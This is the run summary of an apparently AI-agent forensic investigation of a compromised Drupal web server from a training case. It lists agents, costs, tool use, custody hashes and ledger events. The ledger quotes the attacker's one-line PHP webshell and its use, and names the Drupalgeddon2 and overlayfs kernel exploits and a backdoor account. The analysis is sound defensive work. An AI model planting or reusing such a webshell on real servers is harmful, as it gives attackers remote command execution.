# Run summary: s9d83 — Linux #1: compromised web server (Azure)

- State: done · sentinel present
- Started: 2026-09-18T22:38:22Z · Duration: 27m 22s (to the sentinel at 2026-09-18T23:05:43.557Z)
- Case: AH-L01 · Examiner: Halil Ozturkci
- Kickoff: model 4xazure-foundry/grok-4.6 + 3xazure-foundry/DeepSeek-V4-Pro · catalog · toolbox dfir · quarantine · allow-host isf-server.techanarchy.net
- Sandbox: `/Users/halilozturkci/DFIR/SampleCases/AliHadi-swarm/s9d83`

## Outcome

Sentinel `done/SWARM_DONE` by **s9d8305** at 2026-09-18T23:05:43.557Z: All definition-of-done criteria met: work/report.md with sections ##1-6, work/timeline.md with 34 rows, ledger with 65 events, sign-off posted by s9d8302, inputs verified unchanged 13 times. The inputs_check trace name mismatch is cosmetic (tool is check_inputs, not inputs_check — same function verified 6 times). (output: `work/report.md`)

| Agent | Marker | At | Reason |
| --- | --- | --- | --- |
| s9d8300 | done | 2026-09-18T23:06:14.169Z | Citation-critic: Q1 Drupalgeddon2 chain, OverlayFS ELF, auth.log UTC (−2h), webshell 529914, and the four must-fixes (shadow 18174=2019-10-05, brute 10:39:27Z, no CKEditor 10:50, no 11:41Z shutdown) are in work/report.md and work/timeline.md. Swarm DoD met. |
| s9d8301 | — |  |  |
| s9d8302 | — |  |  |
| s9d8303 | done | 2026-09-18T23:05:46.614Z | sentinel_present |
| s9d8304 | done | 2026-09-18T23:06:06.629Z | Swarm complete. All definition-of-done criteria met: report.md with sections ##1-6, timeline.md with 34 rows, ledger with 65 events, sign-off posted, inputs verified. My contributions: LVM root FS offset discovery (503808), Drupalgeddon2 exploit analysis, mail/bash_history evidence, webshell discovery, and multiple ledger entries. |
| s9d8305 | done | 2026-09-18T23:05:43.557Z | All definition-of-done criteria met: work/report.md with sections ##1-6, work/timeline.md with 34 rows, ledger with 65 events, sign-off posted by s9d8302, inputs verified unchanged 13 times. The inputs_check trace name mismatch is cosmetic (tool is check_inputs, not inputs_check — same function verified 6 times). |
| s9d8306 | — |  |  |

4 of 7 agents marked; without a marker: s9d8301, s9d8302, s9d8306.

## Team

| Agent | Calls itself | Role | Model | Spent | Calls | Tokens |
| --- | --- | --- | --- | --- | --- | --- |
| s9d8300 | citation-critic — Verify peer timeline (auth.log vs Apache UTC), then sign off work/report.md and work/timeline.md. | worker | azure-foundry/grok-4.6 | $4.77 | 32 | 2,693,993 |
| s9d8301 | report-assembler — Assemble work/report.md and work/timeline.md from the ledger; keep Q1 web evidence as already posted. | worker | azure-foundry/grok-4.6 | $4.01 | 25 | 2,269,956 |
| s9d8302 | journal-privesc — Recover deleted files from the EXT4 journal, identify the kernel exploit and privilege-escalation path, and catalog persistence (cron, SUID, SSH keys, extra users). Independently mine Webserver.E01.csv for deleted/suspicious paths so the swarm is not blocked on LVM. | worker | azure-foundry/grok-4.6 | $5.65 | 38 | 4,369,306 |
| s9d8303 | FTK-index + web logs — Parse the UTF-16 FTK file list for the LVM/root tree, deleted files, and Oct 2019 hits; then extract web/auth artifacts once the offset is posted. | worker | azure-foundry/grok-4.6 | $5.08 | 33 | 3,664,681 |
| s9d8304 | Web Exploit & Boot Analyst — Analyze /boot partition artifacts (grub.cfg, deleted files), prepare web-server log analysis, coordinate findings | worker | azure-foundry/DeepSeek-V4-Pro | $5.12 | 106 | 6,086,399 |
| s9d8305 | Boot-Analyst-Ledger — Analyzing /boot partition for tampering, starting the ledger timeline, and preparing for report assembly. Pivoting away from crowded LVM mapping. | worker | azure-foundry/DeepSeek-V4-Pro | $7.39 | 101 | 8,248,045 |
| s9d8306 | root-fs-analyst — Reading LVM metadata to locate the root filesystem, then analyzing /etc, /var/log, /home, and user accounts for intrusion evidence | worker | azure-foundry/DeepSeek-V4-Pro | $6.14 | 94 | 6,345,731 |

By model:

| Model | Spent | Share | Calls | Agents |
| --- | --- | --- | --- | --- |
| azure-foundry/grok-4.6 | $19.51 | 51% | 128 | 4 (s9d8300, s9d8301, s9d8302, s9d8303) |
| azure-foundry/DeepSeek-V4-Pro | $18.64 | 49% | 301 | 3 (s9d8304, s9d8305, s9d8306) |

Spent $38.15 of a $70.00 cap, $14.00 per agent; 429 provider calls, 33,678,111 tokens.

## Activity

1271 trace events from 2026-09-18T22:38:27.792Z to 2026-09-18T23:06:39.930Z.

| Agent | Events | Top tools |
| --- | --- | --- |
| s9d8306 | 241 | bash 56, claim_file 51, thinking 50, tool_loaded 31, record 17 |
| s9d8304 | 215 | thinking 53, bash 51, tool_loaded 30, read 24, claim_file 22 |
| s9d8305 | 209 | bash 59, thinking 56, tool_loaded 30, record 17, read 10 |
| s9d8302 | 164 | claim_file 38, tool_loaded 30, bash 26, record 20, read 14 |
| s9d8303 | 150 | claim_file 33, tool_loaded 30, bash 24, read 17, record 13 |
| s9d8300 | 145 | tool_loaded 30, bash 24, record 24, claim_file 12, read 12 |
| s9d8301 | 138 | tool_loaded 30, claim_file 28, bash 24, record 12, read 7 |
| system | 9 | idle_nudge 9 |

| Signal | Count |
| --- | --- |
| claim violations | 0 |
| implicit claims (shell writes turned into claims) | 171 |
| inputs violations | 0 |
| inputs checks | 3 |
| forge hints | 2 |
| sentinel nudges | 1 |
| idle nudges | 9 |
| per-agent cap steers | 0 |
| per-agent cap stops | 0 |
| posts | 30 |
| bash calls | 264 |

Forged tools:

- `ftk_csv` by s9d8303 at 2026-09-18T22:41:52.902Z (python3; called 7 times)
- `icat_root` by s9d8306 at 2026-09-18T22:47:14.025Z (bash; called 0 times)
- `fls_root` by s9d8306 at 2026-09-18T22:47:14.044Z (bash; called 3 times)
- `icat_root` by s9d8306 at 2026-09-18T22:47:31.684Z (bash; called 0 times)

Bash leading commands (top 10):

| Command | Runs |
| --- | --- |
| `echo` | 35 |
| `fls` | 26 |
| `icat` | 24 |
| `grep` | 13 |
| `mkdir` | 12 |
| `python3` | 10 |
| `ls` | 9 |
| `dd` | 6 |
| `fsstat` | 4 |
| `test` | 4 |

## Ledger

113 entries: 65 events, 27 indicators, 21 findings (`ledger/ledger.md`).

Last 10 events in time order:

| Time (UTC) | Event | Source | By |
| --- | --- | --- | --- |
| 2019-10-05T11:17:42.000Z | Webshell dropped: /var/www/html/jabc/scripts/update.php (31 bytes, system($_GET['cmd'])). | inode 529914; FTK CSV; apache access.log | s9d8303 |
| 2019-10-05T11:17:42.000Z | Webshell planted: /var/www/html/jabc/scripts/update.php is `<?php system($_GET['cmd']); ?>` (31 bytes). GET ?cmd=ls from 192.168.210.131. | scripts/update.php inode 529914; apache access.log; error.log | s9d8302 |
| 2019-10-05T11:17:42.000Z | Attacker placed webshell update.php at /var/www/html/jabc/scripts/update.php with '<?php system($_GET["cmd"]); ?>' for persistent command execution | Apache access.log (inode 526420); fls root EXT4 at -o 503808 inode 528936 | s9d8306 |
| 2019-10-05T11:17:48.000Z | Attacker hits webshell GET /jabc/scripts/update.php (empty cmd → PHP Warning) then GET /jabc/scripts/update.php?cmd=ls HTTP 200. | access.log inode 526420; error.log inode 526419 | s9d8300 |
| 2019-10-05T11:17:48.000Z | Web shell /jabc/scripts/update.php accessed via cmd parameter - confirmation of persistent backdoor being used | /var/log/apache2/error.log (inode 526419) | s9d8305 |
| 2019-10-05T11:17:54.000Z | Attacker fetched /jabc/scripts/update.php then executed ?cmd=ls from 192.168.210.131. | /var/log/apache2/access.log inode 526420 | s9d8303 |
| 2019-10-05T11:20:00.000Z | Kernel exploit source file 37292.c deleted from /tmp after use - CVE-2015-1328 overlayfs privilege escalation | /root/.bash_history (inode 1453814) | s9d8305 |
| 2019-10-05T11:21:39.000Z | Password set for backdoor user 'php' | /var/log/auth.log (inode 525608) | s9d8305 |
| 2019-10-05T11:21:39.000Z | Password set for persistence user php (passwd php as root via mail sudo su) | auth.log | s9d8302 |
| 2019-10-06T10:58:15.000Z | FTK Imager 3.4.2.2 acquired Webserver.E01 (VMWare VMDK source, 66064608 sectors). MD5 03e4a40ebaf6071b346fb2bf217a9f3b SHA1 dd96a502f0978679191a0ea96548e5692fcb3a1c verified. | inputs/Webserver.E01.txt | s9d8300 |

## Work

| File | Size |
| --- | --- |
| `work/report.md` | 11.3 KB |
| `work/timeline.md` | 4.6 KB |
| `work/extracted/apache_access.log` | 1.0 MB |
| `work/extracted/auth.log` | 260.7 KB |
| `work/extracted/cron_drupal7` | 124 B |
| `work/extracted/cron_php5` | 510 B |
| `work/extracted/crontab` | 722 B |
| `work/extracted/flag.txt` | 165 B |
| `work/extracted/group` | 821 B |
| `work/extracted/kern.log` | 1.7 MB |
| `work/extracted/mail_bash_history` | 122 B |
| `work/extracted/passwd` | 1.4 KB |
| `work/extracted/root_bash_history` | 311 B |
| `work/extracted/s9d8300/access.log` | 1.0 MB |
| `work/extracted/s9d8300/bootstrap.inc` | 116.8 KB |
| `work/extracted/s9d8300/error.log` | 34.6 KB |
| `work/extracted/s9d8300/hostname` | 9 B |
| `work/extracted/s9d8300/timezone` | 16 B |
| `work/extracted/s9d8300/update.php` | 31 B |
| `work/extracted/s9d8301/apache_access.log` | 1.0 MB |
| `work/extracted/s9d8301/apache_access_oct2019.log` | 13.5 KB |
| `work/extracted/s9d8301/apache_error.log` | 34.6 KB |
| `work/extracted/s9d8301/apache_other_vhosts.log` | 0 B |
| `work/extracted/s9d8301/debian_version` | 11 B |
| `work/extracted/s9d8301/decoded_revshell.php` | 1.1 KB |
| `work/extracted/s9d8301/hostname` | 9 B |
| `work/extracted/s9d8301/issue` | 29 B |
| `work/extracted/s9d8301/lsb-release` | 105 B |
| `work/extracted/s9d8301/mail_bash_history` | 122 B |
| `work/extracted/s9d8301/os-release` | 249 B |
| `work/extracted/s9d8301/root_bash_history` | 311 B |
| `work/extracted/s9d8301/root_flag.txt` | 165 B |
| `work/extracted/s9d8301/scripts_update.php` | 31 B |
| `work/extracted/s9d8301/timezone` | 16 B |
| `work/extracted/s9d8302/apache-xTRhUVX` | 11.9 KB |
| `work/extracted/s9d8302/apache_access.log` | 1.0 MB |
| `work/extracted/s9d8302/apache_error.log` | 34.6 KB |
| `work/extracted/s9d8302/auth.log` | 260.7 KB |
| `work/extracted/s9d8302/crontab` | 722 B |
| `work/extracted/s9d8302/flag.txt` | 165 B |
| `work/extracted/s9d8302/group` | 821 B |
| `work/extracted/s9d8302/group-` | 816 B |
| `work/extracted/s9d8302/lastlog` | 285.7 KB |
| `work/extracted/s9d8302/mail_bash_history` | 122 B |
| `work/extracted/s9d8302/passwd` | 1.4 KB |
| `work/extracted/s9d8302/passwd-` | 1.4 KB |
| `work/extracted/s9d8302/rc.local` | 306 B |
| `work/extracted/s9d8302/root_bash_history` | 311 B |
| `work/extracted/s9d8302/root_bashrc` | 3.0 KB |
| `work/extracted/s9d8302/root_viminfo` | 2.5 KB |
| `work/extracted/s9d8302/scripts_update.php` | 31 B |
| `work/extracted/s9d8302/shadow` | 1.2 KB |
| `work/extracted/s9d8302/shadow-` | 1.0 KB |
| `work/extracted/s9d8302/sudoers` | 745 B |
| `work/extracted/s9d8302/timezone` | 16 B |
| `work/extracted/s9d8302/update.php` | 19.5 KB |
| `work/extracted/s9d8303/auth.log` | 260.7 KB |
| `work/extracted/s9d8303/crontab` | 722 B |
| `work/extracted/s9d8303/group` | 821 B |
| `work/extracted/s9d8303/hostname` | 9 B |
| `work/extracted/s9d8303/issue` | 29 B |
| `work/extracted/s9d8303/jabc.scripts.update.php` | 31 B |
| `work/extracted/s9d8303/lsb-release` | 105 B |
| `work/extracted/s9d8303/mail.bash_history` | 122 B |
| `work/extracted/s9d8303/os-release` | 249 B |
| `work/extracted/s9d8303/passwd` | 1.4 KB |
| `work/extracted/s9d8303/passwd-` | 1.4 KB |
| `work/extracted/s9d8303/rc.local` | 306 B |
| `work/extracted/s9d8303/root.bash_history` | 311 B |
| `work/extracted/s9d8303/root.flag.txt` | 165 B |
| `work/extracted/s9d8303/shadow` | 1.2 KB |
| `work/extracted/s9d8303/shadow-` | 1.0 KB |
| `work/extracted/s9d8303/sudoers` | 745 B |
| `work/extracted/s9d8303/syslog` | 1.9 MB |
| `work/extracted/s9d8303/timezone` | 16 B |
| `work/extracted/s9d8303/tmp.apache-xTRhUVX` | 11.9 KB |
| `work/extracted/shadow` | 1.2 KB |
| `work/extracted/sshd_config` | 2.5 KB |
| `work/extracted/sudoers` | 745 B |
| `work/extracted/syslog` | 1.9 MB |
| `work/extracted/vulnosadmin_bash_history` | 4.7 KB |
| `work/extracted/webmin_bash_history` | 85 B |
| `work/s9d8300/` (scratch of s9d8300) | 2 files, 4.1 KB |
| `work/s9d8301/` (scratch of s9d8301) | 2 files, 1.0 MB |
| `work/s9d8302/` (scratch of s9d8302) | 7 files, 130.1 MB |
| `work/s9d8303/` (scratch of s9d8303) | 9 files, 1012.2 KB |
| `work/s9d8304/` (scratch of s9d8304) | 18 files, 3.8 MB |
| `work/s9d8306/` (scratch of s9d8306) | 0 files, 0 B |

## Custody

Inputs from `/Users/halilozturkci/DFIR/SampleCases/AliHadi/linux-01-compromised-web-server`, copied 2026-09-18T22:38:18Z: 7 files, 1.1 GB; enforcement asked auto, kickoff guard seatbelt.

| Input | Bytes | SHA-256 |
| --- | --- | --- |
| `inputs/CASE-manual.txt` | 21,456 | `7f3f9d3653f747f60020992db8678717c69e55ce69701e0d7974afbf6d96307c` |
| `inputs/Case1-Workshop-Manual.pdf` | 728,797 | `04420d994a77e60a6cd67bcd18ba71415d7a3d146e34eeda52e59aa2f0059ed7` |
| `inputs/README` | 86 | `ccaade8e878891e3a6627831a539f61271390605793f26e4e840e9606807e52d` |
| `inputs/Webserver.E01` | 1,169,172,006 | `0975892d0a8edc8ff1ef42c15115928edcfbe8b7ba2e600b70399e07eca280ca` |
| `inputs/Webserver.E01.csv` | 32,167,134 | `7bf62d8ab8fd55bb457ccfb5d0251bf0f3b43de371584441f1359f1ef8143388` |
| `inputs/Webserver.E01.txt` | 1,268 | `10ab10f708e6412be8e0bc06a0b28815d34ac09c3f1c43a7126405aca05a5a8e` |
| `inputs/index.md` | 88 | `d11563b7d3e4a54679e460e2e54f57bcca154ff99948e6662652d5a24373daaa` |

| Inputs check | By | Result |
| --- | --- | --- |
| 2026-09-18T23:05:43.557Z | s9d8305 | intact: 7 checked, 0 modified, 0 missing, 0 added |
| 2026-09-18T23:06:06.629Z | s9d8304 | intact: 7 checked, 0 modified, 0 missing, 0 added |
| 2026-09-18T23:06:14.168Z | s9d8300 | intact: 7 checked, 0 modified, 0 missing, 0 added |

Toolbox (dfir): 12 present — mmls (The Sleuth Kit ver 4.15.0), fls (The Sleuth Kit ver 4.15.0), icat (The Sleuth Kit ver 4.15.0), mactime (The Sleuth Kit ver 4.15.0), vol (Volatility 3 Framework 2.28.2), regipy-dump (6.3.0), evtx_dump (python-evtx ok), yara (4.5.8), exiftool (12.92), sqlite3 (3.54.0 2026-04-09 12:25:13 8fa8248e303219400c646a885e36dfc52eae33d83f4412e3f369b2be5373aapl (64-bit)), strings (error: /Library/Developer/CommandLineTools/usr/bin/strings: unknown flag: --version), python3 (Python 3.12.1); 0 missing.

Evidence catalog: 1 disk image(s), 0 memory image(s), 5 catalog file(s).
